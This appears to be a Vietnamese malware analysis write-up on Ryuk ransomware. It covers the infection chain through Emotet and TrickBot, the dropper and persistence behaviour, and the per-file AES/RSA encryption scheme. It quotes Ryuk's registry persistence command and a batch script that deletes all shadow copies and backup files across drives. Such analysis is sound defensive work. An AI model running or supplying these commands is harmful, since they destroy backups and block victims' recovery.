> Tên tài liệu: _Ryuk ransomware analysis_  
> Thực hiện: _Dat_  
> Cập nhật lần cuối: _25/08/2025_
## Mục lục:
1. [Attack chain](#a)
2. [Phân tích Ryuk](#b)
3. [Encryption](#c)

## Nội dung
<a name="a"></a>
### 1. Attack chain
<img width="1153" height="424" alt="image" src="https://github.com/user-attachments/assets/33a72cd1-def2-4dfd-a3de-507654079894" />
> Workflow:

- Phishing email: word document chứa macro
- Download Emotet thông qua kích hoạt macro
- Emotet download TrickBot - malware có thể system information, steal credentials, disable AV, lateral movement,...
- Connect C&C để download Ryuk để lây nhiễm và mã hóa hệ thống trong mạng.

Ryuk hoạt động 2 giai đoạn:
- Drop real Ryuk ransomware
- Injection running process, sửa đổi registry thông qua cmd
<img width="1491" height="472" alt="2" src="https://github.com/user-attachments/assets/9f485985-3fcf-400a-879c-3e78cbf988de" />

<a name="b"></a>
### 2. Phân tích Ryuk 
#### Cơ chế hoạt động
> Dropper
- Kiểm tra windows MajorVersion để quyết định vị trí drop real ransomware ryuk
  - Windows 2000 | Windows XP | Windows Server 2003: C:\Documents and Settings\Default User\
  - Windows Vista or later: C:\Users\Public\
- Random name ransomware: random 5 kí tự
- Kiểm tra kiến trúc máy tính để quyết định write payload 64 bit hay 32 bit
- Gọi ShellExecuteW() để execute
> Ransomware
- Xóa dropper
- Persistence: C:\Windows\System32\cmd.exe /C REG ADD "HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /v "svchos" /t REG_SZ /d "C:\users\Public\BPWPc.exe" /f
- Privilege Escalation: sử dụng AdjustTokenPrivileges() để enable SeDebugPrivilege --> tác động đến các running process
- Injection chính nó vào các process (ngoại trừ các process running NT AUTHORITY)
- Sử dụng obfuscation với các import function
- Killing process sử dụng `net stop` and `taskkill`
- Delete backup: drop script tại C:\Users\Public\window.bat để xóa tất cả shadow copies, backups và tự xóa nó.
```
vssadmin Delete Shadows /all /quiet
vssadmin resize shadowstorage /for=c: /on=c: /maxsize=401MB
vssadmin resize shadowstorage /for=c: /on=c: /maxsize=unbounded
vssadmin resize shadowstorage /for=d: /on=d: /maxsize=401MB
vssadmin resize shadowstorage /for=d: /on=d: /maxsize=unbounded
vssadmin resize shadowstorage /for=e: /on=e: /maxsize=401MB
vssadmin resize shadowstorage /for=e: /on=e: /maxsize=unbounded
vssadmin resize shadowstorage /for=f: /on=f: /maxsize=401MB
vssadmin resize shadowstorage /for=f: /on=f: /maxsize=unbounded
vssadmin resize shadowstorage /for=g: /on=g: /maxsize=401MB
vssadmin resize shadowstorage /for=g: /on=g: /maxsize=unbounded
vssadmin resize shadowstorage /for=h: /on=h: /maxsize=401MB
vssadmin resize shadowstorage /for=h: /on=h: /maxsize=unbounded
vssadmin Delete Shadows /all /quiet
del /s /f /q c:\*.VHD c:\*.bac c:\*.bak c:\*.wbcat c:\*.bkf c:\Backup*.* c:\backup*.* c:\*.set c:\*.win c:\*.dsk
del /s /f /q d:\*.VHD d:\*.bac d:\*.bak d:\*.wbcat d:\*.bkf d:\Backup*.* d:\backup*.* d:\*.set d:\*.win d:\*.dsk
del /s /f /q e:\*.VHD e:\*.bac e:\*.bak e:\*.wbcat e:\*.bkf e:\Backup*.* e:\backup*.* e:\*.set e:\*.win e:\*.dsk
del /s /f /q f:\*.VHD f:\*.bac f:\*.bak f:\*.wbcat f:\*.bkf f:\Backup*.* f:\backup*.* f:\*.set f:\*.win f:\*.dsk
del /s /f /q g:\*.VHD g:\*.bac g:\*.bak g:\*.wbcat g:\*.bkf g:\Backup*.* g:\backup*.* g:\*.set g:\*.win g:\*.dsk
del /s /f /q h:\*.VHD h:\*.bac h:\*.bak h:\*.wbcat h:\*.bkf h:\Backup*.* h:\backup*.* h:\*.set h:\*.win h:\*.dsk
del %0
```

<a name="c"></a>
### 3. Encryption
- Sử dụng multi threading: tại một thread mới cho mỗi file mã hóa
- Liệt kê file --> mỗi file mỗi thread --> mã hóa
  - Tránh các file có extensions: .dll, .exe, .ink, .hrmlog, .ini
- Tạo random key AES 256 cho mỗi thread mã hóa file
- AES key được mã hóa với RSA public key
- Ryuk write metadata gồm 274 bytes ở cuối mỗi file mã hóa, với 6 bytes đầu `HERMES`, 12 byte blob RSA information, 256 bytes encypted key
- Liệt kê network share với WNetOpenEnumW() và WNetEnumResourceA() và tiếp tục mã hóa 






